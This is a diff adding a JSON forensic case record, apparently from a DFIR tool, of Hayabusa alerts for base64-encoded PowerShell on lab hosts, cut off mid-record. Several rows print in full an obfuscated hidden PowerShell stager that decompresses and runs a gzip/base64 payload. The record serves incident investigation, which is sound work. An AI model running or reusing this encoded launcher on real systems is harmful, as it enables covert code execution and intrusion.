@@ -1,0 +1,402 @@
+{
+ "case": "CASE-7FA5756A (T12), captured 2026-10-28 for Part 12 FM-3/FM-9",
+ "lead": {
+  "audit_ids": [
+   "nexus-claudebot-20261025-005"
+  ],
+  "detail": "Hayabusa high detection [c03c42ba-1e4e-45c3-c0ba-c8d38b077ee7]: Base64 Encoded PowerShell Command Detected — 6 occurrence(s) on fs03vuln.offsec.lan, srvdefender01.offsec.lan; first 2021-04-21T14:56:43Z → last 2021-04-22T08:51:05Z; ATT&CK T1027 Obfuscated Files or Information, T1140 Deobfuscate/Decode Files or Information, T1059.001 PowerShell",
+  "extra": {
+   "attack_ids": [
+    "T1027",
+    "T1140",
+    "T1059.001"
+   ],
+   "attack_names": [
+    "T1027 Obfuscated Files or Information",
+    "T1140 Deobfuscate/Decode Files or Information",
+    "T1059.001 PowerShell"
+   ],
+   "attack_source": "rule",
+   "count": 6,
+   "crit_high": true,
+   "engine": "hayabusa",
+   "engines": [
+    "hayabusa"
+   ],
+   "first": "2021-04-21T14:56:43Z",
+   "hosts": [
+    "fs03vuln.offsec.lan",
+    "srvdefender01.offsec.lan"
+   ],
+   "last": "2021-04-22T08:51:05Z",
+   "level": "high",
+   "rule_id": "c03c42ba-1e4e-45c3-c0ba-c8d38b077ee7"
+  },
+  "family": "hayabusa",
+  "kind": "rule_engine",
+  "rows": [
+   {
+    "computer": "fs03vuln.offsec.lan",
+    "details": "Cmdline: C:\\Windows\\system32\\cmd.exe /b /c start /b /min powershell.exe -nop -w hidden -noni -c \"if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\\syswow64\\WindowsPowerShell\\v1.0\\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-noni -n",
+    "doc_id": "55da215c7b26301a09a6ab5168fc7b92743115b0",
+    "event_id": "4688",
+    "file": "C:\\STUDY\\Github\\CADRE-Platform\\DFIR-Nexus\\cases\\CASE-7FA5756A\\runs\\RUN-20261025T204002238832Z-tools-43036348\\extractions\\hayabusa\\evtx-timeline.csv",
+    "level": "high",
+    "line": 68,
+    "rule_id": "c03c42ba-1e4e-45c3-c0ba-c8d38b077ee7",
+    "rule_title": "Base64 Encoded PowerShell Command Detected",
+    "timestamp": "2021-04-22T08:51:04Z"
+   },
+   {
+    "computer": "fs03vuln.offsec.lan",
+    "details": "Cmdline: powershell.exe -nop -w hidden -noni -c \"if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\\syswow64\\WindowsPowerShell\\v1.0\\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-noni -nop -w hidden -c &([scriptblock]::create((New-Obj",
+    "doc_id": "00db4145c689bb77ecf6ba27cf4cc2783fdb2a1c",
+    "event_id": "4688",
+    "file": "C:\\STUDY\\Github\\CADRE-Platform\\DFIR-Nexus\\cases\\CASE-7FA5756A\\runs\\RUN-20261025T204002238832Z-tools-43036348\\extractions\\hayabusa\\evtx-timeline.csv",
+    "level": "high",
+    "line": 69,
+    "rule_id": "c03c42ba-1e4e-45c3-c0ba-c8d38b077ee7",
+    "rule_title": "Base64 Encoded PowerShell Command Detected",
+    "timestamp": "2021-04-22T08:51:04Z"
+   },
+   {
+    "computer": "fs03vuln.offsec.lan",
+    "details": "Cmdline: \"C:\\Windows\\syswow64\\WindowsPowerShell\\v1.0\\powershell.exe\" -noni -nop -w hidden -c &([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String('H4sIAPg2gWACA7VWbW+bSBD+nEj5D6iy",
+    "doc_id": "2506750067847404d678e2de8f7329c7e6d0c103",
+    "event_id": "4688",
+    "file": "C:\\STUDY\\Github\\CADRE-Platform\\DFIR-Nexus\\cases\\CASE-7FA5756A\\runs\\RUN-20261025T204002238832Z-tools-43036348\\extractions\\hayabusa\\evtx-timeline.csv",
+    "level": "high",
+    "line": 70,
+    "rule_id": "c03c42ba-1e4e-45c3-c0ba-c8d38b077ee7",
+    "rule_title": "Base64 Encoded PowerShell Command Detected",
+    "timestamp": "2021-04-22T08:51:05Z"
+   },
+   {
+    "computer": "srvdefender01.offsec.lan",
+    "details": "Cmdline: C:\\Windows\\system32\\cmd.exe /b /c start /b /min powershell.exe -nop -w hidden -noni -c \"if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\\syswow64\\WindowsPowerShell\\v1.0\\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-noni -n",
+    "doc_id": "47290785b58c6be6d3c048672ac380656ad0ac9d",
+    "event_id": "4688",
+    "file": "C:\\STUDY\\Github\\CADRE-Platform\\DFIR-Nexus\\cases\\CASE-7FA5756A\\runs\\RUN-20261025T204002238832Z-tools-43036348\\extractions\\hayabusa\\evtx-timeline.csv",
+    "level": "high",
+    "line": 318,
+    "rule_id": "c03c42ba-1e4e-45c3-c0ba-c8d38b077ee7",
+    "rule_title": "Base64 Encoded PowerShell Command Detected",
+    "timestamp": "2021-04-21T14:56:43Z"
+   },
+   {
+    "computer": "srvdefender01.offsec.lan",
+    "details": "Cmdline: powershell.exe -nop -w hidden -noni -c \"if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\\syswow64\\WindowsPowerShell\\v1.0\\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-noni -nop -w hidden -c &([scriptblock]::create((New-Obj",
+    "doc_id": "ce229c48fc713d22321a3c45fdd0024924b8be57",
+    "event_id": "4688",
+    "file": "C:\\STUDY\\Github\\CADRE-Platform\\DFIR-Nexus\\cases\\CASE-7FA5756A\\runs\\RUN-20261025T204002238832Z-tools-43036348\\extractions\\hayabusa\\evtx-timeline.csv",
+    "level": "high",
+    "line": 319,
+    "rule_id": "c03c42ba-1e4e-45c3-c0ba-c8d38b077ee7",
+    "rule_title": "Base64 Encoded PowerShell Command Detected",
+    "timestamp": "2021-04-21T14:56:43Z"
+   }
+  ],
+  "score": 0.9,
+  "subject": "Base64 Encoded PowerShell Command Detected"
+ },
+ "docs": [
+  {
+   "family": "hayabusa",
+   "file": "hayabusa/evtx-timeline.csv",
+   "line": 68,
+   "text": "\"2021-04-22 14:21:04.851 +05:30\",\"Base64 Encoded PowerShell Command Detected\",\"high\",\"fs03vuln.offsec.lan\",\"Sec\",4688,435120,\"Cmdline: C:\\Windows\\system32\\cmd.exe /b /c start /b /min powershell.exe -nop -w hidden -noni -c \"\"if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\\syswow64\\WindowsPowerShell\\v1.0\\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-noni -nop -w hidden -c &([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(''H4sIAPg2gWACA7VWbW+bSBD+nEj5D6iyBKiOIbbbvEiVbgFju4kdbBI7sWud1rCGbRbWgSWO0/a/32CgTa/pXXvSIb/sy8zszDPPzrDKYk9QHku+w91M+nSwv+fgBEeSUouy9fqkLtXSsaPu7cFGjXd7+K30TlLmaL22eIRpvDg7M7MkIbEo5o0uEShNSbRklKSKKn2WpiFJyOHl8iPxhPRJqv3Z6DK+xKwU25rYC4l0iGI/37vgHs4darhrRoUif/ggq/PDo0Wjc59hliqyu00FiRo+Y7IqfVHzA6+2a6LIA+olPOUr0ZjSuNVsXMcpXpEhWHsgAyJC7qeyCmHAJyEiS2KpCCi3UOwrMgydhHvI9xOSpnJdmue254vFH8q8PHicxYJGpNGPBUn42iXJA/VI2ujh2GdkTFYL0HJFQuNgoaog9sDviFKLM8bq0u+YUYZkU8H2q0rKcyWQckSi1iGXLwU64H7GSKEqv+BpQQAVnpIEAN6Xg/2D/VXFGc82njMGRnvz3ZiAe4rDU7oTeyfpdWkA52DBky1Ma1dJRtTFV3AhEcGbSf3n+keVMIgKi03PYW0+4dRfgE6Z01rQub/M13/OTYusaEysbYwj6lX0U17CmawY2cXYqMSG4JUilxvEtwgjARY5cHm6f1DrRFR81TUyynySIA9ylYJXkEb1e2eKXChyPx6QCEAq5sC/2gpITyrpkujb6vR8DkKyyXCa1iUng1vn1SWXYEb8uoTilJZbKBN8N5S/uTvImKAeTkVlbqFWOJbnmTxORZJ5kDeI/cpdE49ilkNRl3rUJ8bWpUF1rvwiECZmDK4CWHqARMBKDoArcjYk4OIu82rDJaIfrRmJQGZ3/W2GA7jsJeF39MEB8eW/e1jxuSBvjkUFwjP/IMEu46IuTWgioIrkuO5o9N/Of1ZAdp6YCSlzoVRXZG5sRc7s2qOXU7KEZQdCIgAAO+GRgVPytl1UCuWVdkkdBM+t1XNnfeEO4GvB1+7HbLA6cYTOI9rq84Fnpk7XPkF0E2y8kyHy/Pc+OXUnbeF2+sJ0UG9EdaMdeoZ+tRsHt/QoCJA/HIUe051OdDHsp4/apjfNbRU2vHa7d6OjVqt92dLvALhc5w50Irp5vIAxlMTLC6OfGnqfdd6b4+W0ac+mrKe17XA15an79tbSNO3Ux9Zgi5DB/dZge3M05lc9LzLaMddOzfYd6iBkxp2JbfDzWyNBjjbBwZqboX9sNgMTGbZHyWx0bRujkW2g6+7He+tUC7TT6Q0OjemkSWfrm3EIc3vTG51rervvkyc+2wBwXY5wMAaZwGx64QpkrNfIeD3kaRPfGRwZIGPP7lE3vF3bDoP9q+smRxM2vMHoYra1Ne3o1mmjns6n3QCNQBwHxgij9MF6srSjic/96Zvh7Uqb3LBjzTJHTniTx6yto/x307POvdnRxrs8bhv6vRnRiC2bvnZ6fWLEm/PAeQj80fR4/DjcLuHca02bvMrZBHSqLWfm0npGlJ/V+QFO0hAzIBDU7+rW2jyxy4rscJprKErRze9IEhMGrRCaZcV9xBj38p6QF29oR0WTyHvWNQxbzRdHqvRVUP3WKaqls7MZeAl36dFrXJA4EGFdf2zpOlR9/bGtQ5C/HpfJ11sFDNXznlHgUhhmO8Nqfrlq7Ol/xqq80SH8+f+C1be1f9j9Jfz0ehnvD+vfL/wWnr8f+xRTAaIuVCVGirb4IgQlM569OLAnyPuqfPI3v8tMHA7hbeJg/y89wtRZZwoAAA==''))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);\"\" ¦ Proc: C:\\Windows\\System32\\cmd.exe ¦ PID: 1768 ¦ User: FS03VULN$ ¦ LID: 0x3e7\",\"ProcessId: 464 ¦ SubjectDomainName: OFFSEC ¦ SubjectUserSid: S-1-5-18 ¦ TokenElevationType: FULL_TOKEN\",\"c03c42ba-1e4e-45c3-c0ba-c8d38b077ee7\"",
+   "fields": {
+    "Timestamp": "2021-04-22 14:21:04.851 +05:30",
+    "RuleTitle": "Base64 Encoded PowerShell Command Detected",
+    "Level": "high",
+    "Computer": "fs03vuln.offsec.lan",
+    "Channel": "Sec",
+    "EventID": "4688",
+    "RecordID": "435120",
+    "Details": "Cmdline: C:\\Windows\\system32\\cmd.exe /b /c start /b /min powershell.exe -nop -w hidden -noni -c \"if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\\syswow64\\WindowsPowerShell\\v1.0\\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-noni -nop -w hidden -c &([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(''H4sIAPg2gWACA7VWbW+bSBD+nEj5D6iyBKiOIbbbvEiVbgFju4kdbBI7sWud1rCGbRbWgSWO0/a/32CgTa/pXXvSIb/sy8zszDPPzrDKYk9QHku+w91M+nSwv+fgBEeSUouy9fqkLtXSsaPu7cFGjXd7+K30TlLmaL22eIRpvDg7M7MkIbEo5o0uEShNSbRklKSKKn2WpiFJyOHl8iPxhPRJqv3Z6DK+xKwU25rYC4l0iGI/37vgHs4darhrRoUif/ggq/PDo0Wjc59hliqyu00FiRo+Y7IqfVHzA6+2a6LIA+olPOUr0ZjSuNVsXMcpXpEhWHsgAyJC7qeyCmHAJyEiS2KpCCi3UOwrMgydhHvI9xOSpnJdmue254vFH8q8PHicxYJGpNGPBUn42iXJA/VI2ujh2GdkTFYL0HJFQuNgoaog9sDviFKLM8bq0u+YUYZkU8H2q0rKcyWQckSi1iGXLwU64H7GSKEqv+BpQQAVnpIEAN6Xg/2D/VXFGc82njMGRnvz3ZiAe4rDU7oTeyfpdWkA52DBky1Ma1dJRtTFV3AhEcGbSf3n+keVMIgKi03PYW0+4dRfgE6Z01rQub/M13/OTYusaEysbYwj6lX0U17CmawY2cXYqMSG4JUilxvEtwgjARY5cHm6f1DrRFR81TUyynySIA9ylYJXkEb1e2eKXChyPx6QCEAq5sC/2gpITyrpkujb6vR8DkKyyXCa1iUng1vn1SWXYEb8uoTilJZbKBN8N5S/uTvImKAeTkVlbqFWOJbnmTxORZJ5kDeI/cpdE49ilkNRl3rUJ8bWpUF1rvwiECZmDK4CWHqARMBKDoArcjYk4OIu82rDJaIfrRmJQGZ3/W2GA7jsJeF39MEB8eW/e1jxuSBvjkUFwjP/IMEu46IuTWgioIrkuO5o9N/Of1ZAdp6YCSlzoVRXZG5sRc7s2qOXU7KEZQdCIgAAO+GRgVPytl1UCuWVdkkdBM+t1XNnfeEO4GvB1+7HbLA6cYTOI9rq84Fnpk7XPkF0E2y8kyHy/Pc+OXUnbeF2+sJ0UG9EdaMdeoZ+tRsHt/QoCJA/HIUe051OdDHsp4/apjfNbRU2vHa7d6OjVqt92dLvALhc5w50Irp5vIAxlMTLC6OfGnqfdd6b4+W0ac+mrKe17XA15an79tbSNO3Ux9Zgi5DB/dZge3M05lc9LzLaMddOzfYd6iBkxp2JbfDzWyNBjjbBwZqboX9sNgMTGbZHyWx0bRujkW2g6+7He+tUC7TT6Q0OjemkSWfrm3EIc3vTG51rervvkyc+2wBwXY5wMAaZwGx64QpkrNfIeD3kaRPfGRwZIGPP7lE3vF3bDoP9q+smRxM2vMHoYra1Ne3o1mmjns6n3QCNQBwHxgij9MF6srSjic/96Zvh7Uqb3LBjzTJHTniTx6yto/x307POvdnRxrs8bhv6vRnRiC2bvnZ6fWLEm/PAeQj80fR4/DjcLuHca02bvMrZBHSqLWfm0npGlJ/V+QFO0hAzIBDU7+rW2jyxy4rscJprKErRze9IEhMGrRCaZcV9xBj38p6QF29oR0WTyHvWNQxbzRdHqvRVUP3WKaqls7MZeAl36dFrXJA4EGFdf2zpOlR9/bGtQ5C/HpfJ11sFDNXznlHgUhhmO8Nqfrlq7Ol/xqq80SH8+f+C1be1f9j9Jfz0ehnvD+vfL/wWnr8f+xRTAaIuVCVGirb4IgQlM569OLAnyPuqfPI3v8tMHA7hbeJg/y89wtRZZwoAAA==''))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);\" ¦ Proc: C:\\Windows\\System32\\cmd.exe ¦ PID: 1768 ¦ User: FS03VULN$ ¦ LID: 0x3e7",
+    "ExtraFieldInfo": "ProcessId: 464 ¦ SubjectDomainName: OFFSEC ¦ SubjectUserSid: S-1-5-18 ¦ TokenElevationType: FULL_TOKEN",
+    "RuleID": "c03c42ba-1e4e-45c3-c0ba-c8d38b077ee7"
+   },
+   "host": "fs03vuln.offsec.lan",
+   "ecs": {
+    "winlog": {
+     "channel": "Security",
+     "event_data": {
+      "ProcessId": "464",
+      "SubjectDomainName": "OFFSEC",
+      "SubjectUserSid": "S-1-5-18",
+      "TokenElevationType": "%%1936",
+      "CommandLine": "C:\\Windows\\system32\\cmd.exe /b /c start /b /min powershell.exe -nop -w hidden -noni -c \"if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\\syswow64\\WindowsPowerShell\\v1.0\\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-noni -nop -w hidden -c &([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(''H4sIAPg2gWACA7VWbW+bSBD+nEj5D6iyBKiOIbbbvEiVbgFju4kdbBI7sWud1rCGbRbWgSWO0/a/32CgTa/pXXvSIb/sy8zszDPPzrDKYk9QHku+w91M+nSwv+fgBEeSUouy9fqkLtXSsaPu7cFGjXd7+K30TlLmaL22eIRpvDg7M7MkIbEo5o0uEShNSbRklKSKKn2WpiFJyOHl8iPxhPRJqv3Z6DK+xKwU25rYC4l0iGI/37vgHs4darhrRoUif/ggq/PDo0Wjc59hliqyu00FiRo+Y7IqfVHzA6+2a6LIA+olPOUr0ZjSuNVsXMcpXpEhWHsgAyJC7qeyCmHAJyEiS2KpCCi3UOwrMgydhHvI9xOSpnJdmue254vFH8q8PHicxYJGpNGPBUn42iXJA/VI2ujh2GdkTFYL0HJFQuNgoaog9sDviFKLM8bq0u+YUYZkU8H2q0rKcyWQckSi1iGXLwU64H7GSKEqv+BpQQAVnpIEAN6Xg/2D/VXFGc82njMGRnvz3ZiAe4rDU7oTeyfpdWkA52DBky1Ma1dJRtTFV3AhEcGbSf3n+keVMIgKi03PYW0+4dRfgE6Z01rQub/M13/OTYusaEysbYwj6lX0U17CmawY2cXYqMSG4JUilxvEtwgjARY5cHm6f1DrRFR81TUyynySIA9ylYJXkEb1e2eKXChyPx6QCEAq5sC/2gpITyrpkujb6vR8DkKyyXCa1iUng1vn1SWXYEb8uoTilJZbKBN8N5S/uTvImKAeTkVlbqFWOJbnmTxORZJ5kDeI/cpdE49ilkNRl3rUJ8bWpUF1rvwiECZmDK4CWHqARMBKDoArcjYk4OIu82rDJaIfrRmJQGZ3/W2GA7jsJeF39MEB8eW/e1jxuSBvjkUFwjP/IMEu46IuTWgioIrkuO5o9N/Of1ZAdp6YCSlzoVRXZG5sRc7s2qOXU7KEZQdCIgAAO+GRgVPytl1UCuWVdkkdBM+t1XNnfeEO4GvB1+7HbLA6cYTOI9rq84Fnpk7XPkF0E2y8kyHy/Pc+OXUnbeF2+sJ0UG9EdaMdeoZ+tRsHt/QoCJA/HIUe051OdDHsp4/apjfNbRU2vHa7d6OjVqt92dLvALhc5w50Irp5vIAxlMTLC6OfGnqfdd6b4+W0ac+mrKe17XA15an79tbSNO3Ux9Zgi5DB/dZge3M05lc9LzLaMddOzfYd6iBkxp2JbfDzWyNBjjbBwZqboX9sNgMTGbZHyWx0bRujkW2g6+7He+tUC7TT6Q0OjemkSWfrm3EIc3vTG51rervvkyc+2wBwXY5wMAaZwGx64QpkrNfIeD3kaRPfGRwZIGPP7lE3vF3bDoP9q+smRxM2vMHoYra1Ne3o1mmjns6n3QCNQBwHxgij9MF6srSjic/96Zvh7Uqb3LBjzTJHTniTx6yto/x307POvdnRxrs8bhv6vRnRiC2bvnZ6fWLEm/PAeQj80fR4/DjcLuHca02bvMrZBHSqLWfm0npGlJ/V+QFO0hAzIBDU7+rW2jyxy4rscJprKErRze9IEhMGrRCaZcV9xBj38p6QF29oR0WTyHvWNQxbzRdHqvRVUP3WKaqls7MZeAl36dFrXJA4EGFdf2zpOlR9/bGtQ5C/HpfJ11sFDNXznlHgUhhmO8Nqfrlq7Ol/xqq80SH8+f+C1be1f9j9Jfz0ehnvD+vfL/wWnr8f+xRTAaIuVCVGirb4IgQlM569OLAnyPuqfPI3v8tMHA7hbeJg/y89wtRZZwoAAA==''))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);\"",
+      "NewProcessName": "C:\\Windows\\System32\\cmd.exe",
+      "NewProcessId": "1768",
+      "SubjectUserName": "FS03VULN$",
+      "SubjectLogonId": "0x3e7"
+     },
+     "record_id": "435120"
+    },
+    "event": {
+     "provider": "Microsoft-Windows-Security-Auditing",
+     "code": "4688"
+    },
+    "process": {
+     "executable": "C:\\Windows\\System32\\cmd.exe",
+     "command_line": "C:\\Windows\\system32\\cmd.exe /b /c start /b /min powershell.exe -nop -w hidden -noni -c \"if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\\syswow64\\WindowsPowerShell\\v1.0\\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-noni -nop -w hidden -c &([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(''H4sIAPg2gWACA7VWbW+bSBD+nEj5D6iyBKiOIbbbvEiVbgFju4kdbBI7sWud1rCGbRbWgSWO0/a/32CgTa/pXXvSIb/sy8zszDPPzrDKYk9QHku+w91M+nSwv+fgBEeSUouy9fqkLtXSsaPu7cFGjXd7+K30TlLmaL22eIRpvDg7M7MkIbEo5o0uEShNSbRklKSKKn2WpiFJyOHl8iPxhPRJqv3Z6DK+xKwU25rYC4l0iGI/37vgHs4darhrRoUif/ggq/PDo0Wjc59hliqyu00FiRo+Y7IqfVHzA6+2a6LIA+olPOUr0ZjSuNVsXMcpXpEhWHsgAyJC7qeyCmHAJyEiS2KpCCi3UOwrMgydhHvI9xOSpnJdmue254vFH8q8PHicxYJGpNGPBUn42iXJA/VI2ujh2GdkTFYL0HJFQuNgoaog9sDviFKLM8bq0u+YUYZkU8H2q0rKcyWQckSi1iGXLwU64H7GSKEqv+BpQQAVnpIEAN6Xg/2D/VXFGc82njMGRnvz3ZiAe4rDU7oTeyfpdWkA52DBky1Ma1dJRtTFV3AhEcGbSf3n+keVMIgKi03PYW0+4dRfgE6Z01rQub/M13/OTYusaEysbYwj6lX0U17CmawY2cXYqMSG4JUilxvEtwgjARY5cHm6f1DrRFR81TUyynySIA9ylYJXkEb1e2eKXChyPx6QCEAq5sC/2gpITyrpkujb6vR8DkKyyXCa1iUng1vn1SWXYEb8uoTilJZbKBN8N5S/uTvImKAeTkVlbqFWOJbnmTxORZJ5kDeI/cpdE49ilkNRl3rUJ8bWpUF1rvwiECZmDK4CWHqARMBKDoArcjYk4OIu82rDJaIfrRmJQGZ3/W2GA7jsJeF39MEB8eW/e1jxuSBvjkUFwjP/IMEu46IuTWgioIrkuO5o9N/Of1ZAdp6YCSlzoVRXZG5sRc7s2qOXU7KEZQdCIgAAO+GRgVPytl1UCuWVdkkdBM+t1XNnfeEO4GvB1+7HbLA6cYTOI9rq84Fnpk7XPkF0E2y8kyHy/Pc+OXUnbeF2+sJ0UG9EdaMdeoZ+tRsHt/QoCJA/HIUe051OdDHsp4/apjfNbRU2vHa7d6OjVqt92dLvALhc5w50Irp5vIAxlMTLC6OfGnqfdd6b4+W0ac+mrKe17XA15an79tbSNO3Ux9Zgi5DB/dZge3M05lc9LzLaMddOzfYd6iBkxp2JbfDzWyNBjjbBwZqboX9sNgMTGbZHyWx0bRujkW2g6+7He+tUC7TT6Q0OjemkSWfrm3EIc3vTG51rervvkyc+2wBwXY5wMAaZwGx64QpkrNfIeD3kaRPfGRwZIGPP7lE3vF3bDoP9q+smRxM2vMHoYra1Ne3o1mmjns6n3QCNQBwHxgij9MF6srSjic/96Zvh7Uqb3LBjzTJHTniTx6yto/x307POvdnRxrs8bhv6vRnRiC2bvnZ6fWLEm/PAeQj80fR4/DjcLuHca02bvMrZBHSqLWfm0npGlJ/V+QFO0hAzIBDU7+rW2jyxy4rscJprKErRze9IEhMGrRCaZcV9xBj38p6QF29oR0WTyHvWNQxbzRdHqvRVUP3WKaqls7MZeAl36dFrXJA4EGFdf2zpOlR9/bGtQ5C/HpfJ11sFDNXznlHgUhhmO8Nqfrlq7Ol/xqq80SH8+f+C1be1f9j9Jfz0ehnvD+vfL/wWnr8f+xRTAaIuVCVGirb4IgQlM569OLAnyPuqfPI3v8tMHA7hbeJg/y89wtRZZwoAAA==''))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);\"",
+     "pid": "1768"
+    },
+    "user": {
+     "name": "FS03VULN$"
+    },
+    "rule": {
+     "name": "Base64 Encoded PowerShell Command Detected",
+     "id": "c03c42ba-1e4e-45c3-c0ba-c8d38b077ee7",
+     "level": "high"
+    },
+    "host": {
+     "name": "fs03vuln.offsec.lan"
+    }
+   },
+   "ts": "2021-04-22T08:51:04Z",
+   "_id": "55da215c7b26301a09a6ab5168fc7b92743115b0"
+  },
+  {
+   "family": "hayabusa",
+   "file": "hayabusa/evtx-timeline.csv",
+   "line": 69,
+   "text": "\"2021-04-22 14:21:04.851 +05:30\",\"Base64 Encoded PowerShell Command Detected\",\"high\",\"fs03vuln.offsec.lan\",\"Sec\",4688,435121,\"Cmdline: powershell.exe -nop -w hidden -noni -c \"\"if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\\syswow64\\WindowsPowerShell\\v1.0\\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-noni -nop -w hidden -c &([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(''H4sIAPg2gWACA7VWbW+bSBD+nEj5D6iyBKiOIbbbvEiVbgFju4kdbBI7sWud1rCGbRbWgSWO0/a/32CgTa/pXXvSIb/sy8zszDPPzrDKYk9QHku+w91M+nSwv+fgBEeSUouy9fqkLtXSsaPu7cFGjXd7+K30TlLmaL22eIRpvDg7M7MkIbEo5o0uEShNSbRklKSKKn2WpiFJyOHl8iPxhPRJqv3Z6DK+xKwU25rYC4l0iGI/37vgHs4darhrRoUif/ggq/PDo0Wjc59hliqyu00FiRo+Y7IqfVHzA6+2a6LIA+olPOUr0ZjSuNVsXMcpXpEhWHsgAyJC7qeyCmHAJyEiS2KpCCi3UOwrMgydhHvI9xOSpnJdmue254vFH8q8PHicxYJGpNGPBUn42iXJA/VI2ujh2GdkTFYL0HJFQuNgoaog9sDviFKLM8bq0u+YUYZkU8H2q0rKcyWQckSi1iGXLwU64H7GSKEqv+BpQQAVnpIEAN6Xg/2D/VXFGc82njMGRnvz3ZiAe4rDU7oTeyfpdWkA52DBky1Ma1dJRtTFV3AhEcGbSf3n+keVMIgKi03PYW0+4dRfgE6Z01rQub/M13/OTYusaEysbYwj6lX0U17CmawY2cXYqMSG4JUilxvEtwgjARY5cHm6f1DrRFR81TUyynySIA9ylYJXkEb1e2eKXChyPx6QCEAq5sC/2gpITyrpkujb6vR8DkKyyXCa1iUng1vn1SWXYEb8uoTilJZbKBN8N5S/uTvImKAeTkVlbqFWOJbnmTxORZJ5kDeI/cpdE49ilkNRl3rUJ8bWpUF1rvwiECZmDK4CWHqARMBKDoArcjYk4OIu82rDJaIfrRmJQGZ3/W2GA7jsJeF39MEB8eW/e1jxuSBvjkUFwjP/IMEu46IuTWgioIrkuO5o9N/Of1ZAdp6YCSlzoVRXZG5sRc7s2qOXU7KEZQdCIgAAO+GRgVPytl1UCuWVdkkdBM+t1XNnfeEO4GvB1+7HbLA6cYTOI9rq84Fnpk7XPkF0E2y8kyHy/Pc+OXUnbeF2+sJ0UG9EdaMdeoZ+tRsHt/QoCJA/HIUe051OdDHsp4/apjfNbRU2vHa7d6OjVqt92dLvALhc5w50Irp5vIAxlMTLC6OfGnqfdd6b4+W0ac+mrKe17XA15an79tbSNO3Ux9Zgi5DB/dZge3M05lc9LzLaMddOzfYd6iBkxp2JbfDzWyNBjjbBwZqboX9sNgMTGbZHyWx0bRujkW2g6+7He+tUC7TT6Q0OjemkSWfrm3EIc3vTG51rervvkyc+2wBwXY5wMAaZwGx64QpkrNfIeD3kaRPfGRwZIGPP7lE3vF3bDoP9q+smRxM2vMHoYra1Ne3o1mmjns6n3QCNQBwHxgij9MF6srSjic/96Zvh7Uqb3LBjzTJHTniTx6yto/x307POvdnRxrs8bhv6vRnRiC2bvnZ6fWLEm/PAeQj80fR4/DjcLuHca02bvMrZBHSqLWfm0npGlJ/V+QFO0hAzIBDU7+rW2jyxy4rscJprKErRze9IEhMGrRCaZcV9xBj38p6QF29oR0WTyHvWNQxbzRdHqvRVUP3WKaqls7MZeAl36dFrXJA4EGFdf2zpOlR9/bGtQ5C/HpfJ11sFDNXznlHgUhhmO8Nqfrlq7Ol/xqq80SH8+f+C1be1f9j9Jfz0ehnvD+vfL/wWnr8f+xRTAaIuVCVGirb4IgQlM569OLAnyPuqfPI3v8tMHA7hbeJg/y89wtRZZwoAAA==''))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);\"\" ¦ Proc: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe ¦ PID: 2032 ¦ User: FS03VULN$ ¦ LID: 0x3e7\",\"ProcessId: 1768 ¦ SubjectDomainName: OFFSEC ¦ SubjectUserSid: S-1-5-18 ¦ TokenElevationType: FULL_TOKEN\",\"c03c42ba-1e4e-45c3-c0ba-c8d38b077ee7\"",
+   "fields": {
